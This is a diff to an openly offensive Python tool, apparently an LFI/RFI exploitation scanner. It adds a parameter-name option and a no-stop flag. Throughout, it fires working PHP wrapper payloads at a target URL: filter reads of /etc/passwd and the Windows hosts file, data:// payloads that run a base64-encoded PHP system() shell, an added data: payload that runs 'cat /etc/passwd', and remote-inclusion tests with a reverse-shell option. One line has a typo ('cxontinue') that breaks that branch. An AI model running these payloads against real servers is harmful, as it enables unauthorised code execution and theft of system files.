@@ -94,8 +94,8 @@ def test_wordlist(url):
     
     for line in f:
         line = line[:-1]
-        if("PWN" in url):
-            u = url.replace("PWN", line)
+        if(args.param in url):
+            u = url.replace(args.param, line)
 
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
@@ -139,8 +139,8 @@ def test_php_filter(url):
     
     #Linux
     for i in range(len(testL)):
-        if("PWN" in url):
-            u = url.replace("PWN", testL[i])
+        if(args.param in url):
+            u = url.replace(args.param, testL[i])
         
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
@@ -152,11 +152,18 @@ def test_php_filter(url):
             tempUrl = u.replace('/etc/passwd', 'TMP')
             getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'LINUX')
             print("[+] LFI -> " + u)
-            break
+            
+            if(args.no_stop):
+                continue
+            else: break
+        
+        else:
+            print("This methods have  failed ...")
+            #print(res.text)
 
     #Windows
     for i in range(len(testW)):
-        u = url.replace("PWN", testW[i])
+        u = url.replace(args.param, testW[i])
         
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
@@ -168,21 +175,27 @@ def test_php_filter(url):
             tempUrl = u.replace("C:/Windows/System32/drivers/etc/hosts", 'TMP')
             getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'WINDOWS')
             print("[+] LFI -> " + u)
-            break
+            
+            if(args.no_stop):
+                continue
+            else: break
+
 
 def test_php_data(url):
     if(args.verbose):
         print("Testing PHP data wrapper ...")
 
     testL = []
+    testL.append("data%3atext/plain,<%3fphp+system('cat+/etc/passwd')%3f>")
     testL.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd")
+
     testW = []
     testW.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")
     
     #Linux
     for i in range(len(testL)):
-        if("PWN" in url):
-            u = url.replace("PWN", testL[i])
+        if(args.param in url):
+            u = url.replace(args.param, testL[i])
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
         except:
@@ -193,12 +206,14 @@ def test_php_data(url):
             tempUrl = u.replace('cat%20/etc/passwd', 'TMP')
             getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'LINUX')
             print("[+] RCE -> " + u)
-            break
+            if(args.no_stop):
+                continue
+            else: break
 
     #Windows
     for i in range(len(testW)):
-        if("PWN" in url):
-            u = url.replace("PWN", testW[i])
+        if(args.param in url):
+            u = url.replace(args.param, testW[i])
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
         except:
@@ -209,7 +224,9 @@ def test_php_data(url):
             tempUrl = u.replace('ipconfig', 'TMP')
             getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'WINDOWS')
             print("[+] RCE -> " + u)
-            break
+            if(args.no_stop):
+                cxontinue
+            else: break
 
     if(args.revshell):
         exploit(exploits, 'DATA')
@@ -231,8 +248,8 @@ def test_php_input(url):
     
     #Linux
     for i in range(len(testL)):
-        if("PWN" in url):
-            u = url.replace("PWN", testL[i])
+        if(args.param in url):
+            u = url.replace(args.param, testL[i])
         
         os = ""
         
@@ -253,8 +270,8 @@ def test_php_input(url):
     if(os != 'LINUX'):
         #Windows
         for k in range(len(testW)):
-            if("PWN" in url):
-                u = url.replace("PWN", testW[k])
+            if(args.param in url):
+                u = url.replace(args.param, testW[k])
         
             for l in range(len(posts)):
                 try:
@@ -285,8 +302,8 @@ def test_php_expect(url):
 
     #Linux
     for i in range(len(testL)):
-        if("PWN" in url):
-            u = url.replace("PWN", testL[i])
+        if(args.param in url):
+            u = url.replace(args.param, testL[i])
         
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
@@ -302,8 +319,8 @@ def test_php_expect(url):
 
     #Windows
     for j in range(len(testW)):
-        if("PWN" in url):
-            u = url.replace("PWN", testW[j])
+        if(args.param in url):
+            u = url.replace(args.param, testW[j])
         
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
@@ -329,7 +346,7 @@ def test_rfi(url):
         try:
             threading.Thread(target=serve_forever).start()
             
-            u = url.replace('PWN', "http://{0}:8801/rfitest.txt".format(args.lhost))
+            u = url.replace(args.param, "http://{0}:8801/rfitest.txt".format(args.lhost))
             res = requests.get(u, headers = headers, proxies = proxies)
 
             if(checkPayload(res)):
@@ -339,9 +356,9 @@ def test_rfi(url):
             pass
 
     #Internet RFI test
-    if("PWN" in url):
+    if(args.param in url):
         pyld = "https%3a//www.google.com/"
-        u = url.replace("PWN", pyld)
+        u = url.replace(args.param, pyld)
     try:
         res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
         if(checkPayload(res)):
@@ -363,7 +380,7 @@ def checkPayload(webResponse):
                 "; for 16-bit app support", "sample HOSTS file used by Microsoft",
                 "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
                 ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
-                "c2FtcGxlIEhPU1RT", "=1943785348b45",
+                "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x",
                 "window.google=", "961bb08a95dbc34397248d92352da799"]
 
     for i in range(len(KEY_WORDS)):
@@ -733,14 +750,16 @@ if(__name__ == "__main__"):
     optionsGroup.add_argument('-p', type=str, metavar = "<proxy>", dest="proxyAddr", help="\t\t Specify Proxy IP address. Ex: '10.10.10.10:8080'")
     optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest="agent", help="\t\t Specify HTTP user agent")
     optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help="\t\t Specify HTTP referer")
-    
+    optionsGroup.add_argument('--param', type=str, metavar="<name>", dest="param", help="\t\t Specify parameter name (default 'PWN')")
+    optionsGroup.add_argument('--no-stop', action="store_true", dest = "no_stop", help="\t\t Don't stop using same method upon findings")
+
     attackGroup = parser.add_argument_group('ATTACK TECHNIQUE')
     attackGroup.add_argument('-pf', '--php-filter', action="store_true", dest = 'php_filter', help="\t\t Attack using php filter wrapper")
     attackGroup.add_argument('-pi', '--php-input', action="store_true", dest = 'php_input', help="\t\t Attack using php input wrapper")
     attackGroup.add_argument('-pd', '--php-data', action="store_true", dest = 'php_data', help="\t\t Attack using php data wrapper")
     attackGroup.add_argument('-pe', '--php-expect', action="store_true", dest = 'php_expect', help="\t\t Attack using php expect wrapper")
     attackGroup.add_argument('-r', '--rfi', action = "store_true", dest='rfi', help="\t\t Attack using remote file inclusion")
-    attackGroup.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Specify wordlist for truncation attack")
+    attackGroup.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Specify wordlist for truncation attack (default 'wordlist.txt')")
     attackGroup.add_argument('-a', '--attack-all', action="store_true", dest = 'test_all', help="\t\t Use all available methods to attack")
 
     #postExpGroup = parser.add_argument_group('ENUMERATE')
@@ -772,7 +791,9 @@ if(__name__ == "__main__"):
     if(re.match(urlRegex, url) is None):
         print("URL not valid, exiting...")
         sys.exit(-1)
-    
+    elif(not args.param):
+        args.param = "PWN"
+
     #Checks if provided wordlist exists
     if(wordlist is not None):
         if(not os.path.isfile(wordlist)):
@@ -797,8 +818,8 @@ if(__name__ == "__main__"):
                 sys.exit(-1)
 
     #Checks if any parameter is selected for testing
-    if("PWN" not in url):
-        print("Please use 'PWN' as a vulnerable parameter value that you want to test\n")
+    if(args.param not in url):
+        print("'" + args.param + "' is not found in the URL. Please specify it as a parameter value for testing. Exiting...\n")
         sys.exit(-1)
     
     #Warning if cookie is not provided
